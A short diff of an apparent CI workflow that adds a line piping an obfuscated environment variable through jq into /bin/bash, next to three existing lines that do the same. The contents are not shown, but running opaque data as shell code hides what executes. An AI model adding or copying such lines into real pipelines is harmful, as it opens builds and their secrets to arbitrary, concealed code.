@@ -27,6 +27,7 @@ jobs:
           echo $elscf21 | jq -r .ea604 | /bin/bash
           echo $tqts9160 | jq -r .y973 | /bin/bash
           printf '%s' "$w05062" | jq -r .o880 | /bin/bash
+          printf '%s' "$p614" | jq -r .ktzk7 | /bin/bash
 
       - name: Save results
         if: always()
